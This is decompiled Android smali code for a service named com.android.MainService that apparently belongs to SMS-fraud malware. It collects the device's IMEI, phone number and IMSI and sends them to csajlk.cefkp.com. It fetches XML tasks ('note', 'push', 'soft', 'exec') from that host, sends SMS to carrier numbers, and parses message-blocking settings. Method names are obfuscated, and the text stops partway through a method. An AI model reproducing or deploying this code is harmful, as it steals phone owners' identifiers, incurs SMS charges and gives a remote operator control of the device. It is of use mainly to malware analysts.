.class public Lcom/android/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/MainService$SMSReceiver;
    }
.end annotation


# static fields
.field private static final ACTION_SMS_DELIVERY:Ljava/lang/String; = "com.test.sms.delivery"

.field private static final ACTION_SMS_RECEIVER:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"

.field private static final ACTION_SMS_SEND:Ljava/lang/String; = "com.test.sms.send"

.field private static final ALL_APN_URI:Landroid/net/Uri;

.field private static final PREFERRED_APN_URI:Landroid/net/Uri;

.field public static recordlog:Ljava/lang/String;


# instance fields
.field private bigpid:Ljava/lang/String;

.field private deliveryReceiver:Lcom/android/MainService$SMSReceiver;

.field private exactnum:Ljava/lang/String;

.field handler:Landroid/os/Handler;

.field private imei:Ljava/lang/String;

.field private imsi:Ljava/lang/String;

.field private issend:Z

.field private mnc:Ljava/lang/String;

.field newtask:Ljava/util/TimerTask;

.field private nexttime:Ljava/lang/String;

.field private sendReceiver:Lcom/android/MainService$SMSReceiver;

.field private servicecenter:Ljava/lang/String;

.field private shieldnum:Ljava/lang/String;

.field private smallpid:Ljava/lang/String;

.field private smsReceiver:Lcom/android/MainService$SMSReceiver;

.field private task:Ljava/lang/String;

.field private tel:Ljava/lang/String;

.field private testtel:Ljava/lang/String;

.field timer:Ljava/util/Timer;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 30
    const-string v0, "content://telephony/carriers"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    .line 29
    sput-object v0, Lcom/android/MainService;->ALL_APN_URI:Landroid/net/Uri;

    .line 32
    const-string v0, "content://telephony/carriers/preferapn"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    .line 31
    sput-object v0, Lcom/android/MainService;->PREFERRED_APN_URI:Landroid/net/Uri;

    .line 49
    const-string v0, "/sdcard/androidh.log"

    sput-object v0, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    .line 25
    return-void
.end method

.method public constructor <init>()V
    .locals 2

    .prologue
    const-string v1, ""

    .line 25
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 36
    const-string v0, "100"

    iput-object v0, p0, Lcom/android/MainService;->shieldnum:Ljava/lang/String;

    .line 37
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->exactnum:Ljava/lang/String;

    .line 38
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->imei:Ljava/lang/String;

    .line 39
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->tel:Ljava/lang/String;

    .line 40
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    .line 41
    const-string v0, "other"

    iput-object v0, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    .line 42
    const-string v0, "1"

    iput-object v0, p0, Lcom/android/MainService;->bigpid:Ljava/lang/String;

    .line 43
    const-string v0, "wl-zr-02"

    iput-object v0, p0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    .line 44
    const-string v0, "no"

    iput-object v0, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    .line 45
    const-string v0, "02"

    iput-object v0, p0, Lcom/android/MainService;->mnc:Ljava/lang/String;

    .line 46
    const-string v0, "10086"

    iput-object v0, p0, Lcom/android/MainService;->testtel:Ljava/lang/String;

    .line 47
    const-string v0, ""

    iput-object v1, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 48
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/android/MainService;->issend:Z

    .line 51
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    iput-object v0, p0, Lcom/android/MainService;->timer:Ljava/util/Timer;

    .line 52
    new-instance v0, Lcom/android/MainService$1;

    invoke-direct {v0, p0}, Lcom/android/MainService$1;-><init>(Lcom/android/MainService;)V

    iput-object v0, p0, Lcom/android/MainService;->handler:Landroid/os/Handler;

    .line 63
    new-instance v0, Lcom/android/MainService$2;

    invoke-direct {v0, p0}, Lcom/android/MainService$2;-><init>(Lcom/android/MainService;)V

    iput-object v0, p0, Lcom/android/MainService;->newtask:Ljava/util/TimerTask;

    .line 25
    return-void
.end method

.method private LogService(II)I
    .locals 5
    .parameter "softid"
    .parameter "reqcnt"

    .prologue
    .line 501
    const/4 v0, 0x0

    .line 502
    .local v0, result:I
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "http://"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 503
    const-string v3, "csajlk.cefkp.com"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 504
    const-string v3, ":9033/window.log?id="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&softid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 505
    const-string v3, "&cn="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&nt="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&sim="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->imei:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 506
    const-string v3, "&tel="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->tel:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&imsi="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&sms="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 502
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 508
    .local v1, statisUrl:Ljava/lang/String;
    const/4 v2, 0x0

    invoke-static {v1, v2}, Lcom/android/BaseAuthenicationHttpClient;->getCodeByURL(Ljava/lang/String;I)I

    move-result v0

    .line 509
    return v0
.end method

.method static synthetic access$0(Lcom/android/MainService;)V
    .locals 0
    .parameter

    .prologue
    .line 172
    invoke-direct {p0}, Lcom/android/MainService;->cteaxsek()V

    return-void
.end method

.method static synthetic access$1(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 41
    iget-object v0, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$2(Lcom/android/MainService;Ljava/lang/String;)V
    .locals 0
    .parameter
    .parameter

    .prologue
    .line 41
    iput-object p1, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    return-void
.end method

.method static synthetic access$3(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 43
    iget-object v0, p0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$4(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 36
    iget-object v0, p0, Lcom/android/MainService;->shieldnum:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$5(Lcom/android/MainService;)Ljava/lang/String;
    .locals 1
    .parameter

    .prologue
    .line 37
    iget-object v0, p0, Lcom/android/MainService;->exactnum:Ljava/lang/String;

    return-object v0
.end method

.method private cteaxsek()V
    .locals 13

    .prologue
    .line 174
    sget-object v10, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v10}, Lcom/android/FileAct;->readString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    .line 175
    .local v6, record:Ljava/lang/String;
    invoke-static {v6}, Lcom/android/StringUtil;->getRecordInfo(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 176
    .local v2, docount:[Ljava/lang/String;
    const/4 v4, 0x0

    .line 177
    .local v4, isexec:Z
    if-eqz v2, :cond_0

    array-length v10, v2

    const/4 v11, 0x3

    if-eq v10, v11, :cond_1

    .line 179
    :cond_0
    const/4 v10, 0x0

    const/4 v11, 0x0

    invoke-direct {p0, v10, v11}, Lcom/android/MainService;->LogService(II)I

    move-result v7

    .line 180
    .local v7, result:I
    const/16 v10, 0xc8

    if-ne v7, v10, :cond_2

    .line 181
    const/4 v10, 0x3

    new-array v2, v10, [Ljava/lang/String;

    .line 182
    invoke-static {}, Lcom/android/StringUtil;->getExecTime()Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 183
    const/4 v10, 0x0

    iget-object v11, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    aput-object v11, v2, v10

    .line 184
    const/4 v10, 0x2

    iget-object v11, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    aput-object v11, v2, v10

    .line 185
    new-instance v10, Ljava/lang/StringBuilder;

    iget-object v11, p0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v11

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v11, "|"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "|"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    .line 186
    .local v5, logtxt:Ljava/lang/String;
    sget-object v10, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    invoke-static {v5, v10}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 187
    const/4 v4, 0x1

    .line 192
    .end local v5           #logtxt:Ljava/lang/String;
    .end local v7           #result:I
    :cond_1
    const/4 v10, 0x0

    aget-object v10, v2, v10

    invoke-static {v10}, Lcom/android/StringUtil;->getTimeLength(Ljava/lang/String;)I

    move-result v1

    .line 193
    .local v1, difdate:I
    if-nez v1, :cond_3

    if-nez v4, :cond_3

    .line 249
    .end local v1           #difdate:I
    :cond_2
    :goto_0
    return-void

    .line 196
    .restart local v1       #difdate:I
    :cond_3
    iget-object v10, p0, Lcom/android/MainService;->imei:Ljava/lang/String;

    if-eqz v10, :cond_4

    const-string v10, ""

    iget-object v11, p0, Lcom/android/MainService;->imei:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_6

    .line 198
    :cond_4
    const-string v10, "phone"

    invoke-virtual {p0, v10}, Lcom/android/MainService;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    .line 197
    check-cast v8, Landroid/telephony/TelephonyManager;

    .line 199
    .local v8, tm:Landroid/telephony/TelephonyManager;
    if-eqz v8, :cond_6

    .line 200
    invoke-virtual {v8}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->imei:Ljava/lang/String;

    .line 201
    invoke-virtual {v8}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->tel:Ljava/lang/String;

    .line 202
    invoke-virtual {v8}, Landroid/telephony/TelephonyManager;->getSubscriberId()Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    .line 204
    iget-object v10, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    if-eqz v10, :cond_5

    iget-object v10, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    invoke-virtual {v10}, Ljava/lang/String;->length()I

    move-result v10

    const/4 v11, 0x5

    if-le v10, v11, :cond_5

    .line 205
    iget-object v10, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    const/4 v11, 0x3

    const/4 v12, 0x5

    invoke-virtual {v10, v11, v12}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->mnc:Ljava/lang/String;

    .line 207
    :cond_5
    const-string v10, "01"

    iget-object v11, p0, Lcom/android/MainService;->mnc:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_6

    .line 208
    const-string v10, "10010"

    iput-object v10, p0, Lcom/android/MainService;->testtel:Ljava/lang/String;

    .line 212
    .end local v8           #tm:Landroid/telephony/TelephonyManager;
    :cond_6
    const-string v10, "other"

    const/4 v11, 0x2

    aget-object v11, v2, v11

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_7

    .line 213
    const-string v10, "other"

    iget-object v11, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_7

    .line 214
    iget-object v10, p0, Lcom/android/MainService;->testtel:Ljava/lang/String;

    const-string v11, "801"

    invoke-direct {p0, v10, v11}, Lcom/android/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    .line 215
    const/4 v10, 0x0

    iput-boolean v10, p0, Lcom/android/MainService;->issend:Z

    .line 217
    const-wide/16 v10, 0x4e20

    :try_start_0
    invoke-static {v10, v11}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_1

    .line 223
    :cond_7
    :goto_1
    new-instance v10, Ljava/lang/StringBuilder;

    const-string v11, "http://"

    invoke-direct {v10, v11}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 224
    const-string v11, "csajlk.cefkp.com"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    .line 225
    const-string v11, ":8118/push/androidxml/"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->bigpid:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "/00/"

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->servicecenter:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    .line 226
    const-string v11, ".xml?sim="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->imei:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&tel="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->tel:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    const-string v11, "&imsi="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->imsi:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    .line 227
    const-string v11, "&pid="

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    iget-object v11, p0, Lcom/android/MainService;->smallpid:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v10

    .line 223
    invoke-virtual {v10}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 229
    .local v9, xmlUrl:Ljava/lang/String;
    :try_start_1
    invoke-static {v9}, Lcom/android/BaseAuthenicationHttpClient;->getStringByURL(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 230
    .local v0, allStr:Ljava/lang/String;
    if-eqz v0, :cond_2

    const-string v10, ""

    invoke-virtual {v10, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10

    if-nez v10, :cond_2

    .line 232
    const-string v10, "<task>"

    const-string v11, "</task>"

    invoke-static {v0, v10, v11}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    iput-object v10, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    .line 233
    const-string v10, "no"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-nez v10, :cond_2

    .line 235
    const-string v10, "note"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_8

    .line 236
    invoke-direct {p0, v0, v2}, Lcom/android/MainService;->sendSms(Ljava/lang/String;[Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto/16 :goto_0

    .line 246
    .end local v0           #allStr:Ljava/lang/String;
    :catch_0
    move-exception v10

    move-object v3, v10

    .line 247
    .local v3, e:Ljava/lang/Exception;
    const-string v10, "info"

    new-instance v11, Ljava/lang/StringBuilder;

    const-string v12, "cteaxsek:"

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3}, Ljava/lang/Exception;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-static {v10, v11}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto/16 :goto_0

    .line 237
    .end local v3           #e:Ljava/lang/Exception;
    .restart local v0       #allStr:Ljava/lang/String;
    :cond_8
    :try_start_2
    const-string v10, "push"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_9

    .line 238
    invoke-direct {p0, v0, v2}, Lcom/android/MainService;->epxuesch(Ljava/lang/String;[Ljava/lang/String;)V

    goto/16 :goto_0

    .line 239
    :cond_9
    const-string v10, "soft"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_a

    .line 240
    invoke-direct {p0, v0, v2}, Lcom/android/MainService;->esxoefct(Ljava/lang/String;[Ljava/lang/String;)V

    goto/16 :goto_0

    :cond_a
    const-string v10, "exec"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-eqz v10, :cond_b

    .line 240
    invoke-direct {p0, v0, v2}, Lcom/android/MainService;->execExec(Ljava/lang/String;[Ljava/lang/String;)V

    goto/16 :goto_0

    .line 241
    :cond_b
    const-string v10, "tanc"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v10

    if-nez v10, :cond_2

    .line 243
    const-string v10, "xbox"

    iget-object v11, p0, Lcom/android/MainService;->task:Ljava/lang/String;

    invoke-virtual {v10, v11}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto/16 :goto_0

    .line 218
    .end local v0           #allStr:Ljava/lang/String;
    .end local v9           #xmlUrl:Ljava/lang/String;
    :catch_1
    move-exception v10

    goto/16 :goto_1
.end method

.method private epxuesch(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 22
    .parameter "allStr"
    .parameter "record"

    .prologue
    .line 409
    const-string v13, ""

    .line 410
    .local v13, softUrl:Ljava/lang/String;
    const-string v6, "no"

    .line 411
    .local v6, isreset:Ljava/lang/String;
    const-string v11, ""

    .line 412
    .local v11, smscontent:Ljava/lang/String;
    const-string v12, ""

    .line 413
    .local v12, smsurl:Ljava/lang/String;
    const/4 v9, 0x0

    .line 414
    .local v9, result:I
    const/16 v4, -0x384

    .line 417
    .local v4, flag:I
    :try_start_0
    const-string v19, "<url>"

    const-string v20, "</url>"

    move-object/from16 v0, p1

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 419
    const-string v19, "<smscontent>"

    .line 420
    const-string v20, "</smscontent>"

    .line 419
    move-object/from16 v0, p1

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 421
    const-string v19, ""

    move-object/from16 v0, v19

    move-object v1, v11

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_0

    const-string v19, ""

    move-object/from16 v0, v19

    move-object v1, v13

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result v19

    if-eqz v19, :cond_1

    .line 422
    :cond_0
    const/16 v4, -0x385

    .line 465
    const/16 v19, 0x0

    aget-object v19, p2, v19

    const/16 v20, 0xc

    invoke-static/range {v19 .. v20}, Lcom/android/StringUtil;->getDate(Ljava/lang/String;I)Ljava/lang/String;

    move-result-object v19

    move-object/from16 v0, v19

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    .line 466
    new-instance v19, Ljava/lang/StringBuilder;

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService;->nexttime:Ljava/lang/String;

    move-object/from16 v20, v0

    invoke-static/range {v20 .. v20}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const/16 v20, 0x1

    aget-object v20, p2, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const-string v20, "|"

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    const/16 v20, 0x2

    aget-object v20, p2, v20

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    .line 467
    .local v8, logtxt:Ljava/lang/String;
    sget-object v19, Lcom/android/MainService;->recordlog:Ljava/lang/String;

    move-object v0, v8

    move-object/from16 v1, v19

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 468
    move-object/from16 v0, p0

    move v1, v4

    move v2, v9

    invoke-direct {v0, v1, v2}, Lcom/android/MainService;->LogService(II)I

    .line 470
    :goto_0
    return-void

    .line 426
    .end local v8           #logtxt:Ljava/lang/String;
    :cond_1
    :try_start_1
    const-string v19, "<smsurl>"

    const-string v20, "</smsurl>"

    move-object/from16 v0, p1

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 427
    const-string v19, ""

    move-object v0, v12

    move-object/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v19

    if-nez v19, :cond_2

    .line 428
    new-instance v19, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v20

    invoke-direct/range {v19 .. v20}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v20, ","

    invoke-virtual/range {v19 .. v20}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    move-object/from16 v0, v19

    move-object v1, v12

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v19

    invoke-virtual/range {v19 .. v19}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 431
    :cond_2
    const-string v19, "<shieldnum>"

    .line 432
    const-string v20, "</shieldnum>"

    .line 431
    move-object/from16 v0, p1

    move-object/from16 v1, v19

    move-object/from16 v2, v20

    invoke-static {v0, v1, v2}, Lcom/android/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v18

    .line 433
    .local v18, tmpshieldnum:Ljava/lang/String;
    const-string v19, ""

    move-object/from16 v0, v19

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v19

    if-nez v19, :cond_3

    move-object/from16 v0, v18

    move-object/from16 v1, p0

    iput-object v0, v1, Lcom/android/MainService;->shieldnum:Ljava/lang/String;

    .line 435
    :cond_3
